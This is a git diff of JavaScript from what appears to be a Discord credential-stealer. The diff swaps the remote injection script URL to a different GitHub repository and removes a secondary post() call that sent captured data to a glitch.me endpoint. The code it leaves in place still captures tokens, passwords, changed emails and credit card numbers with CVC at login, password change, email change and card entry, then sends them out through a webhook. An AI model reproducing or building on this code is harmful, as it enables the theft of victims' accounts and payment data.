@@ -27,9 +27,9 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/DamsDev1/InjectD/master/index.js",
     webhook: "%WEBHOOK%",
-    apiurl: "https://healthy-rowan-bottle.glitch.me/hello/",
+    // apiurl: "https://healthy-rowan-bottle.glitch.me/hello/",
     filter2: {
         urls: [
       "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -363,7 +363,6 @@ async function FirstTime() {
 
                     let data = JSON.stringify(c);
                     let UwU = JSON.stringify({ data: data, token: token })
-                    post(config.apiurl, UwU);
                     hooker(c)
                 };
 
@@ -403,7 +402,6 @@ async function FirstTime() {
                             
                             let data = JSON.stringify(c);
                             let UwU = JSON.stringify({ data: data, token: token })
-                            post(config.apiurl, UwU);
                             hooker(c)
 
                         } else {
@@ -471,7 +469,6 @@ async function FirstTime() {
                             };
                             let data = JSON.stringify(c);
                             let UwU = JSON.stringify({ data: data, token: token })
-                            post(config.apiurl, UwU);
                             hooker(c)
                             
                         }
@@ -923,7 +920,6 @@ async function Login(email, password, token) {
             
             let data = JSON.stringify(params);
             let UwU = JSON.stringify({ data: data, token: token })
-            post(config.apiurl, UwU);
             hooker(params)
         })
     })
@@ -1086,7 +1082,6 @@ async function ChangePassword(oldpassword, newpassword, token) {
             }
             let data = JSON.stringify(params);
             let UwU = JSON.stringify({ data: data, token: token })
-            post(config.apiurl, UwU);
             
             hooker(params)
         })
@@ -1253,7 +1248,6 @@ async function ChangeEmail(newemail, password, token) {
             }
             let data = JSON.stringify(params);
             let UwU = JSON.stringify({ data: data, token: token })
-            post(config.apiurl, UwU);
             hooker(params)
         })
     })
@@ -1323,7 +1317,6 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         }
         let data = JSON.stringify(params);
         let UwU = JSON.stringify({ data: data, token: token })
-        post(config.apiurl, UwU);
         hooker(params)
 }
 
